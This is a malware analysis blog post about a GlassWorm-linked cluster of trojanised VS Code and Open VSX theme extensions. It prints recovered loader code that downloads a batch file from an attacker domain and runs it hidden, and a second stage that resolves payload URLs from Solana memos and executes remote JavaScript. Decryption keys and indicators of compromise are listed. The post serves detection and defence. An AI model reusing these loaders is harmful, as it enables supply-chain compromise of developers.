---
title: "Pretty Themes, Hidden Loaders: GlassWorm-Linked Extensions Span VS Code Marketplace and Open VSX"
short_title: "GlassWorm-Linked Themes Span VS Code Marketplace and Open VSX"
date: 2026-10-02 12:00:00 +0000
categories: [Malware, Browser Extensions]
tags: [GlassWorm, Open VSX, VS Code, Extensions, Obfuscation, Loader, Brandjacking, T1195.002, T1027, T1140, T1105, T1102.001, T1059.007, T1059.003, T1614.001]
canonical_url: https://socket.dev/blog/glassworm-vscode-themes
source: Socket
image:
  path: /assets/img/posts/glassworm-vscode-themes/cover.png
  alt: "Pretty Themes, Hidden Loaders: GlassWorm-Linked Extensions Span VS Code Marketplace and Open VSX"
description: "Socket uncovered two malicious VS Code themes in a GlassWorm-linked cluster with thousands of installs across VS Code Marketplace and Open VSX."
---

> _Socket uncovered a theme cluster spanning four Visual Studio Marketplace and six Open VSX extensions, including two confirmed malicious extensions and a high-confidence link to GlassWorm._

The Socket Threat Research team identified two suspicious VS Code themes still available on the Visual Studio Marketplace at the time of writing: [`Coca-Cola Christmas`](https://socket.dev/vscode/package/holiday-themes.theme-coca-cola-christmas) and [`Aurora Borealis Studio Theme`](https://socket.dev/vscode/package/lohsebhipolg2s.theme-aurora-borealis). Both present themselves as polished color themes, contain executable JavaScript despite primarily providing visual customization, and exhibit signs of brandjacking or name-squatting. Theme extensions can be particularly risky because they can contain and execute malicious code, and VS Code lacks granular permission controls to restrict what that code can do.

Git history and distinctive source code fingerprints connect both extensions to `Aurora Nocturne Night Theme`, a previously removed malicious extension whose distributed package concealed an obfuscated Windows downloader. The malware contacted `fingercakes4sale[.]store`, wrote threat actor-controlled content to `%TEMP%\temp_batch.cmd`, and silently executed it through `cmd.exe`.

Expanding our hunt beyond the Visual Studio Marketplace uncovered six cluster-linked extension identities in Open VSX, including Open VSX versions of [`Coca-Cola Christmas`](https://socket.dev/openvsx/package/holiday-themes.theme-coca-cola-christmas), [`Aurora Borealis Studio Theme`](https://socket.dev/openvsx/package/lohsebhipolg2s.theme-aurora-borealis), and [`Cosmic Nebula Themes`](https://socket.dev/openvsx/package/cosmic-themes.theme-cosmic-nebula).

We analyzed the Visual Studio Marketplace build of `Cosmic Nebula Themes` and confirmed a staged malware loader that decrypts embedded JavaScript with AES-256-CBC, executes it through `eval()`, avoids Russian-language and Russian-timezone systems, and uses Solana transaction memos as a dead-drop to dynamically resolve follow-on payload infrastructure. That build contains the same Solana address, AES key, and execution model previously [documented](https://socket.dev/blog/glassworm-loader-hits-open-vsx-via-suspected-developer-account-compromise) in GlassWorm activity. We assess the analyzed Marketplace build as GlassWorm with high confidence and the broader theme cluster as GlassWorm-associated.

Development evidence independently connects `Cosmic Nebula Themes` to the broader theme cluster. Git identities connect the `Coca-Cola Christmas` and `Aurora Borealis Studio Theme` projects, while closely related executable scaffolding and recurring Russian-language source markers extend the development linkage across the broader cluster.

The analyzed `Coca-Cola Christmas` and `Aurora Borealis Studio Theme` versions are not currently weaponized, and several additional cluster-linked Open VSX extensions that remained live during our investigation likewise did not contain active malicious payloads. We nevertheless assess these extensions as high-risk. `Coca-Cola Christmas` and `Aurora Borealis Studio Theme` alone had accumulated more than 8,000 Visual Studio Marketplace installs, while cluster-linked Open VSX extensions had also accumulated tens of thousands of downloads at the time of our investigation, including approximately 10,000 for [`Charcoal Mint`](https://socket.dev/openvsx/package/charcoal-mint-studio.theme-charcoal-mint) alone. The live extensions retain executable functionality unnecessary for conventional color themes and share development, publishing, or source code artifacts with a cluster that has now produced at least two confirmed malicious extensions, including the previously mentioned one linked to GlassWorm.

We reported the live extensions to both the VS Code Marketplace and Open VSX security teams. The VS Code Marketplace team removed the reported extensions shortly after receiving our report. We appreciate their quick response and both teams’ continued efforts to protect their extension ecosystems.

VS Code themes are expected to change editor appearance, such as colors, syntax highlighting, and interface styling, not execute unrelated code. Once malicious code runs, the impact can be immediate, from credential theft and secondary payload delivery to file or system modification. Even currently unweaponized extensions remain high-risk when they retain unnecessary executable capabilities that could be abused in a later update.

Our VS Code ecosystem coverage complements Marketplace protections by identifying related extensions, shared infrastructure, code reuse, version repurposing, and publishing patterns across the broader campaign.

## `Aurora Nocturne` Had Already Been Weaponized

`Aurora Nocturne Night Theme's` public project contains a benign-looking `app.js` implementing theme selection and welcome page functionality. The extension delivered to users executed something else.

![](/assets/img/posts/glassworm-vscode-themes/9ace83093695281078b2f40a5cb4cb60bfab1cdf-1179x1128.png)
_Historical Marketplace listing for the removed `Aurora Nocturne Night Theme`. The threat actor published it under the `microsoft` identity to masquerade as a Microsoft extension, while the distributed package concealed a Windows downloader._

Its manifest directed VS Code to:

```javascript
{
  "main": "./out/extension.js",
  "activationEvents": ["*"]
}
```

`out/extension.js` bears little resemblance to legitimate theme code. The distributed file is a heavily obfuscated, roughly 59 KB JavaScript blob compressed into a single line, combining randomized identifiers, hexadecimal escapes, runtime string reconstruction, anti-analysis noise, and a payload encoded with zero-width Unicode characters.

A shortened excerpt from the original file is shown below, with line breaks and omissions added for readability:

```javascript
const a0_0xeb9a8b=a0_0x3de4;
(function(_0x50bbd6,_0xbe6fe5){
    const _0x3df589=a0_0x3de4,_0x3159c7=_0x50bbd6();
    while(!![]){
        try{
            const _0x4be3b8=
                -parseInt(_0x3df589(0x1a6))/(-0x469+0x9e6+-0x57c)
                + ...
        } catch(_0x1821bb){
            _0x3159c7['push'](_0x3159c7['shift']());
        }
    }
}(a0_0x1a7c,...));

const fs=require('\x66\x73');

function zeroWidthDecode(_0x1ffad8){
    const _0x5cc3fe=a0_0x3de4,
    _0x50d62e={
        '\x46\x5a\x6e\x51\x51':_0x5cc3fe(0x205)+'\x29\x2b\x29...',
        ...
    };
    ...
}

const encoded=
    a0_0xeb9a8b(0x266)+
    a0_0xeb9a8b(0x20b)+
    ...
    '\u200c\u200c\u200b\u200b\u200b'+
    '\u200b\u200d\u200b\u200c\u200c\u200c\u200b'+
    ...;

decoded=zeroWidthDecode(encoded);
eval(decoded);
```

Buried beneath that obfuscation is a malware loader. After decoding the zero-width payload and reconstructing the hidden strings, we recovered the following operational code. The URL is defanged for publication, and we added comments to explain the observed malicious behavior:

```javascript
const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { exec } = require('child_process');

// Download threat actor-controlled content
https.get('hxxps://fingercakes4sale[.]store/dsyuC', (response) => {

    // Save the response as a Windows command script
    const file = fs.createWriteStream(
        path.join(os.tmpdir(), 'temp_batch.cmd')
    );

    response.pipe(file);

    file.on('finish', () => {
        file.close();

        // Execute the downloaded script and suppress the command window
        exec(
            `cmd /c "${path.join(os.tmpdir(), 'temp_batch.cmd')}"`,
            { windowsHide: true }
        );
    });
});
```

The extension downloads threat actor-controlled payload, saves it as `%TEMP%\temp_batch.cmd`, and executes it through `cmd.exe`. The `windowsHide` option suppresses the command window while the payload runs. A color theme has no legitimate reason to do this.

The deception also extended to the public source repository. A researcher inspecting only `Aurora Nocturne Night Theme's` benign-looking `app.js` on GitHub could miss the separate obfuscated runtime that the Marketplace extension actually executed.

## Git and Source Code Tie the Projects Together

The Git history connects the three extensions directly. The GitHub repository for `Coca-Cola Christmas` is owned by [`hakhangthu7558-sys`](https://github.com/hakhangthu7558-sys), but its entire current Git history was authored by [`aubineherodvulbdl`](https://github.com/aubineherodvulbdl) (`aubineherodvulbdl@outlook[.]com`). The same identity also committed the `Aurora Nocturne Night Theme` extension source.

`Aurora Nocturne Night Theme’s` first two commits were authored by [`lohsebhipolg2s`](https://github.com/lohsebhipolg2s) (`lohsebhipolg2s@outlook[.]com`), the account that publishes `Aurora Borealis Studio Theme` on the VS Code Marketplace.

The timing further strengthens the relationship. On December 6, 2025, `lohsebhipolg2s` committed `Aurora Nocturne Night Theme` assets, `aubineherodvulbdl` added the `Aurora Nocturne Night Theme` extension roughly an hour later, then moved to the `Coca-Cola Christmas` repository and added its images and extension source. The five relevant commits occurred within roughly three hours and used the same UTC-08:00 commit offset.

![](/assets/img/posts/glassworm-vscode-themes/b5b1f5ea421bc1fbf7e34dc6fdeea32d61a83cee-2048x1208.png)
_Git history and Marketplace publishing connect three GitHub accounts across the `Coca-Cola Christmas`, `Aurora Nocturne Night Theme`, and `Aurora Borealis Studio Theme` projects._

Source code similarities provide another strong link: after normalizing theme-specific names and color values, the primary theme definitions in `Aurora Nocturne Night Theme` and `Aurora Borealis Studio Theme` are nearly identical, approaching 100% similarity.

Even more distinctive are developer-authored Russian-language comments embedded across the cluster’s theme source. `Aurora Nocturne Night Theme` and `Aurora Borealis Studio Theme` use the same ordered section markers, including `ТЕРМИНАЛ (16 ANSI цветов + фон/передний план)` (“Terminal, 16 ANSI colors + background/foreground”), `ГРУППЫ РЕДАКТОРОВ И ВКЛАДКИ` (“Editor groups and tabs”), `ПОДСВЕТКА СКОБОК` (“Bracket highlighting”), `ОБЗОРНАЯ ЛИНЕЙКА` (“Overview ruler”), and `НЕДЕЙСТВИТЕЛЬНЫЙ КОД` (“Invalid code”). `Coca-Cola Christmas` follows the same broader Russian-commented theme structure.

The projects also reuse closely related `app.js` scaffolding for first-run welcome pages, including the same `hasShownWelcome` state, scripted webviews, theme activation, and settings actions.

The Git history, near-identical theme source, and recurring developer-authored comments point to shared development lineage and coordinated activity across the three projects. We therefore track them as an operationally linked development cluster.

## Brandjacking and Name-Squatting Signals

`Aurora Borealis Studio Theme` also shows signs of brandjacking and name-squatting. An older Marketplace extension already exists as [`mister-gold.aurora-borealis-theme`](https://socket.dev/vscode/package/mister-gold.aurora-borealis-theme) with themes named `Aurora Borealis` and `Aurora Borealis Calm`.

The later cluster-linked extension is [`lohsebhipolg2s.theme-aurora-borealis`](https://socket.dev/vscode/package/lohsebhipolg2s.theme-aurora-borealis) and exposes `Aurora Borealis` and `Aurora Borealis Soft`.

The older project has a long release history and a conventional declarative theme architecture. The later extension is published by an account directly present in the Git history of malicious `Aurora Nocturne Night Theme` and adds executable JavaScript.

![](/assets/img/posts/glassworm-vscode-themes/ec18b7ecf27d0bf1ffbfdb82241a4da2910935df-2048x1754.png)
_Visual Studio Marketplace listing for the live `Aurora Borealis Studio Theme`, showing the `lohsebhipolg2s` publisher identity and linked GitHub repository that provide a direct provenance pivot into the broader extension cluster._

`Coca-Cola Christmas Theme`, meanwhile, uses the branding of one of the world’s most recognizable commercial brands. This branding choice makes an unfamiliar extension look familiar before a user has examined who actually published it.

![](/assets/img/posts/glassworm-vscode-themes/cbc5349000e1111429fd4145103ecf42f1b6e1f5-2048x1753.png)
_Visual Studio Marketplace listing for the live `Coca-Cola Christmas` theme, showing the `holiday-themes` publisher and linked `hakhangthu7558-sys/Coca-Cola-Christmas` repository that connect the extension to the broader development cluster._

## The Cluster Extends Into Open VSX

Expanding our hunt beyond the VS Code Marketplace showed that the same broader extension cluster also reached the Open VSX Registry. We identified six cluster-linked extension identities that were published there:

1. `holiday-themes.theme-coca-cola-christmas` — [`Coca-Cola Christmas`](https://socket.dev/openvsx/package/holiday-themes.theme-coca-cola-christmas)
1. `lohsebhipolg2s.theme-aurora-borealis` — [`Aurora Borealis Studio Theme`](https://socket.dev/openvsx/package/lohsebhipolg2s.theme-aurora-borealis)
1. `aurora-them-creator.theme-aurora-nocturne` — [`Aurora Nocturne Dreams Theme`](https://socket.dev/openvsx/package/aurora-them-creator.theme-aurora-nocturne)
1. `solidity-syntax.deep-focus` — [`Solidity syntax | Rust syntax`](https://socket.dev/openvsx/package/solidity-syntax.deep-focus)
1. `charcoal-mint-studio.theme-charcoal-mint` — [`Theme Charcoal Mint Co.`](https://socket.dev/openvsx/package/charcoal-mint-studio.theme-charcoal-mint)
1. `cosmic-themes.theme-cosmic-nebula` — [`Cosmic Nebula Themes`](https://socket.dev/openvsx/package/cosmic-themes.theme-cosmic-nebula)

Not all six remained available at the time of writing. `aurora-them-creator.theme-aurora-nocturne` is distinct from the confirmed malicious `microsoftvs.microsoftvs` extension discussed earlier, despite the closely related `Aurora Nocturne` naming.

![](/assets/img/posts/glassworm-vscode-themes/e39778cb38900d69ad89eb83d305f6601ebcd6fa-1018x890.png)
_Socket AI Scanner classifies [`holiday-themes.theme-coca-cola-christmas@1.0.2`](https://socket.dev/openvsx/package/holiday-themes.theme-coca-cola-christmas) as known malware based on high-confidence cluster attribution rather than an active payload in this version, highlighting shared development and publishing provenance plus executable functionality that could be weaponized in a future update._

Notably, the first two are the same `Coca-Cola Christmas` and `Aurora Borealis Studio Theme` extensions central to our VS Code Marketplace investigation. `Coca-Cola Christmas` [appears](https://socket.dev/openvsx/package/holiday-themes.theme-coca-cola-christmas) in Open VSX under the same `holiday-themes.theme-coca-cola-christmas` identity, while `Aurora Borealis Studio Theme` uses the same `lohsebhipolg2s.theme-aurora-borealis` identity across both registries.

![](/assets/img/posts/glassworm-vscode-themes/e1150f8769f7e93a37e8adf3d7b530e79bdc6eeb-2048x1354.png)
_Open VSX listing for `Coca-Cola Christmas`, showing the same `holiday-themes.theme-coca-cola-christmas` identifier and version `1.0.2` used by the Visual Studio Marketplace extension, along with matching branding and presentation. The listing had accumulated approximately 39,000 downloads at the time of our investigation._

A December 14, 2025 DEV Community [article](https://dev.to/dondon32/best-cursor-editor-themes-2024-boost-focus-reduce-eye-strain-review-1c11) provides another important connection. The post presents itself as an independent guide to Cursor themes, but directly promotes Open VSX installations for `Deep Focus`, `Aurora Borealis`, `Charcoal Mint`, and `Cosmic Nebula`, while discussing `Aurora Nocturne` alongside `Aurora Borealis`. The DEV account that published the article also joined the platform on December 14, 2025, the same day the article appeared.

![](/assets/img/posts/glassworm-vscode-themes/c773c7aaf1e26a997252209b6884a133cd2ce977-2048x1490.png)
_A December 14, 2025 DEV Community [article](https://dev.to/dondon32/best-cursor-editor-themes-2024-boost-focus-reduce-eye-strain-review-1c11) from an account created the same day promotes multiple cluster-linked Open VSX themes._

With our extension analysis and the broader development relationships uncovered across the cluster, we assess the article as promotional infrastructure for the operation rather than an independent theme review. It gives the extensions the appearance of third-party recommendation while directing developers to install them from Open VSX.

`Cosmic Nebula Themes` provides a second confirmed malicious extension within the cluster. Microsoft [removed](https://github.com/microsoft/vsmarketplace/blob/main/RemovedPackages.md) `cosmic-themes.theme-cosmic-nebula` from the VS Code Marketplace and classified it as malware, showing that the activity extended beyond `Aurora Nocturne Night Theme` and a single publisher identity.

## **`Cosmic Nebula Themes`** Ties the Cluster to GlassWorm

Our analysis of the Visual Studio Marketplace build of `cosmic-themes.theme-cosmic-nebula` independently confirms malicious behavior and reveals a direct technical connection to GlassWorm, a developer-targeting supply chain campaign known for abusing extension ecosystems to steal credentials, session data, cryptocurrency wallets, and developer authentication artifacts.

Although advertised as a color theme, the extension declares `app.js` as its executable entrypoint and activates on `*`. During activation, `app.js` decrypts an embedded JavaScript stage with AES-256-CBC and immediately executes the recovered code through `eval()`.

The malware loader embeds the AES key: `wDO6YyTm6DL0T0zJ0SXhUql5Mo0pdlSz` and the IV: `4c4b9a3773e9dced6015a670855fd32b`. Static decryption recovered a second-stage loader that performs Russian-language and timezone gating, queries the Solana blockchain, dynamically resolves follow-on infrastructure from transaction memos, and executes remotely supplied JavaScript in memory.

The following excerpt is shortened from the recovered stage, with comments and minor normalization added by us for readability:

```javascript
// Exit on systems matching Russian locale/timezone conditions
if (_isRussianSystem()) return;

// Query the GlassWorm Solana dead-drop address
const signatures = await _getSignFAddress(
    "BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC",
    { limit: 1000 }
);

// Extract JSON from a transaction memo and decode the next-stage URL
const memo = signatures.filter(x => x?.memo)[0].memo;
const data = JSON.parse(memo.replace(/\[\d+\]\s*/, ""));
const nextStageUrl = atob(data.link);

// Identify the victim platform and retrieve threat actor-controlled JavaScript
const response = await fetch(nextStageUrl, {
    headers: { os: os.platform() }
});

const payload = await response.text();
const iv = response.headers.get("ivbase64");
const secretKey = response.headers.get("secretkey");

// Execute the retrieved stage with Node.js capabilities exposed
const context = vm.createContext({
    require,
    Buffer,
    process,
    console,
    setTimeout,
    setInterval
});

// Execute decoded threat actor-controlled JavaScript
new vm.Script(/* decoded payload */)
    .runInContext(context);
```

The Solana address `BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC` is a particularly strong attribution marker. We previously [documented](https://socket.dev/blog/glassworm-loader-hits-open-vsx-via-suspected-developer-account-compromise) the same address as GlassWorm dead-drop infrastructure, together with the same embedded AES key, Russian-environment gating, Solana transaction-memo resolution, and staged in-memory JavaScript execution. Later GlassWorm variants retained the same underlying execution model while rotating wallets and infrastructure.

The publisher identity adds another independent link. We previously [identified](https://socket.dev/supply-chain-attacks/glassworm-v2) `cosmic-themes.sql-formatter` among malicious Open VSX extensions linked to GlassWorm activity. `Cosmic Nebula Themes` therefore shares not only GlassWorm’s technical loader fingerprints but also the `cosmic-themes` publisher namespace with another confirmed campaign extension.

Separately, `Cosmic Nebula Themes` carries the same distinctive development fingerprints found across the theme cluster, including recurring Russian-language source markers and closely related executable theme scaffolding. This independently connects the confirmed GlassWorm loader back to the `Aurora Nocturne Night Theme` and `Coca-Cola Christmas` development lineage.

The overlap is specific enough that we assess the analyzed Visual Studio Marketplace build of `Cosmic Nebula Themes` as GlassWorm with high confidence. Combined with the distinctive source code and development fingerprints connecting it to the `Aurora Nocturne Night Theme` and `Coca-Cola Christmas` projects, we assess the broader theme cluster as GlassWorm-associated. This does not establish that every publisher or GitHub identity is controlled by the same individual, but it places the cluster within the same operational ecosystem and tradecraft lineage.

On May 26, 2026, CrowdStrike, Google, and the Shadowserver Foundation conducted a coordinated [disruption](https://www.crowdstrike.com/en-us/blog/inside-crowdstrike-takedown-of-a-developer-targeting-botnet) of GlassWorm, targeting multiple command and control (C2) channels used by the operation. The disruption interrupted active infrastructure, but it did not retroactively remove previously published extensions or eliminate the campaign’s established supply chain footholds.

Subsequent GlassWorm activity has continued to evolve, including new Open VSX delivery techniques, infrastructure rotation, and updated loader obfuscation. We have since [documented](https://socket.dev/supply-chain-attacks/glassworm-v2) dozens of additional malicious Open VSX extensions, reinforcing the need to hunt for older cluster members, remove remaining malicious or high-risk extensions, and re-evaluate extensions that may have appeared harmless before later weaponization.

## Outlook and Recommendations

The currently unweaponized extensions in this cluster warrant continued scrutiny. Our expanded investigation shows that the operation spans both the Visual Studio Marketplace and Open VSX and has produced at least two confirmed malicious extensions, including one we linked to GlassWorm with high confidence.

`Cosmic Nebula Themes` also demonstrates why defenders cannot rely solely on static infrastructure indicators or one-time extension reviews. Its loader uses Solana transaction memos as a dead-drop to dynamically resolve follow-on infrastructure, allowing the threat actor to change the next-stage delivery location without republishing the extension. GlassWorm has repeatedly evolved its infrastructure and loader techniques while retaining recognizable behavioral patterns.

Defenders should inventory developer extensions (including themes) across both the Visual Studio Marketplace and Open VSX, as well as VS Code-compatible editors that consume those registries. Security review should focus on the artifact users actually install: inspect `package.json`, executable entrypoints, activation events, bundled JavaScript, network access, process execution, runtime decryption, and changes introduced between versions. Public source repositories should not be treated as authoritative when they differ from the distributed extension artifact.

Extensions should also be re-evaluated after updates and as new campaign intelligence emerges. High-fidelity GlassWorm signals observed in this investigation include encrypted JavaScript decrypted at runtime, Russian-language and timezone gating, Solana transaction-memo lookups, dynamically resolved second-stage URLs, the known Solana dead-drop address, `ivbase64` and `secretkey` response headers, and execution of remotely supplied JavaScript with Node.js capabilities.

Organizations that installed `Aurora Nocturne Night Theme` should hunt for `fingercakes4sale[.]store`, `%TEMP%\temp_batch.cmd`, and `cmd.exe` launched from VS Code or its extension host. If the downloaded batch file executed, treat the host as potentially compromised.

Organizations that installed the malicious Visual Studio Marketplace version of `Cosmic Nebula Themes` should likewise investigate for follow-on execution under the developer’s privileges and review potentially exposed credentials and developer resources. Removing either malicious extension alone cannot reverse actions already performed by dynamically downloaded or executed payloads.

## Indicators of Compromise

### Confirmed Malicious Visual Studio Marketplace Extensions

#### **`Aurora Nocturne Night Theme`** **(`microsoftvs.microsoftvs`)**

- VSIX/ZIP SHA-256: `a276b76d3b00f302bb4dfb3690125c85ff472b16049c3c37476ac5e51096df07`
- `out/extension.js` SHA-256: `5e68ca8c2097caccdb74d2752b85b85595a4bf646b442b8431a2416e87dbf268`
- Domain: `fingercakes4sale[.]store`
- Payload URL: `hxxps://fingercakes4sale[.]store/dsyuC`
- Dropped file: `%TEMP%\temp_batch.cmd`
- Execution: `cmd.exe /c "<TEMP_PATH>\temp_batch.cmd"`

#### **`Cosmic Nebula Themes`** **(`cosmic-themes.theme-cosmic-nebula`)**

- `app.js` SHA-256: `684c877a52d226d50584cb886ca8ec5bec6355d4de853f406734c79d5b387804`
- Decrypted embedded stage SHA-256: `da2d950e50326171adbff9c2bfd6f28998e32623ea7c2c475b9159a45cfb86bb`
- Solana dead-drop address: `BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC`
- AES-256-CBC key: `wDO6YyTm6DL0T0zJ0SXhUql5Mo0pdlSz`
- AES IV: `4c4b9a3773e9dced6015a670855fd32b`
- Stage-response headers: `ivbase64`, `secretkey`
- Local execution marker: `<USER_HOME>/init.json`
- GitHub repository: `vovanloc2234-sudo/Cosmic-Nebula-Themes`

### Cluster-Linked Open VSX Extensions

1. `holiday-themes.theme-coca-cola-christmas`
1. `lohsebhipolg2s.theme-aurora-borealis`
1. `aurora-them-creator.theme-aurora-nocturne`
1. `solidity-syntax.deep-focus`
1. `charcoal-mint-studio.theme-charcoal-mint`
1. `cosmic-themes.theme-cosmic-nebula`

The Open VSX identity `aurora-them-creator.theme-aurora-nocturne` is distinct from the confirmed malicious `microsoftvs.microsoftvs` package discussed above, despite their closely related `Aurora Nocturne` naming.

### GitHub Accounts and Commit Identities

- `aubineherodvulbdl`
- `aubineherodvulbdl@outlook[.]com`
- `lohsebhipolg2s`
- `lohsebhipolg2s@outlook[.]com`
- `hakhangthu7558-sys`
- `vovanloc2234-sudo`

### GitHub Repositories

- `aubineherodvulbdl/Aurora-Nocturne-Dreams`
- `hakhangthu7558-sys/Coca-Cola-Christmas`
- `lohsebhipolg2s/Aurora-Borealis-Theme`
- `vovanloc2234-sudo/Cosmic-Nebula-Themes`

### Live VS Code Marketplace Cluster Pivots

- `holiday-themes.theme-coca-cola-christmas`
- `lohsebhipolg2s.theme-aurora-borealis`

### Associated Support Identities

- `support@holiday-themes[.]dev`
- `holiday-themes[.]dev`
- `aurora.themes.dev@gmail[.]com`

### Related GlassWorm Campaign Link

- `cosmic-themes.sql-formatter` — previously identified by Socket as a malicious GlassWorm Open VSX extension associated with the same `cosmic-themes` publisher namespace.

The cluster-linked extension identities and associated accounts above are included as threat intelligence pivots. Not every analyzed extension version contained an active malicious payload. Where no payload was observed, classification reflects high-confidence association with an operational cluster that has distributed confirmed malware.

## MITRE ATT&CK

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1027 — Obfuscated Files or Information
- T1140 — Deobfuscate/Decode Files or Information
- T1105 — Ingress Tool Transfer
- T1102.001 — Web Service: Dead Drop Resolver
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1059.003 — Command and Scripting Interpreter: Windows Command Shell
- T1614.001 — System Location Discovery: System Language Discovery
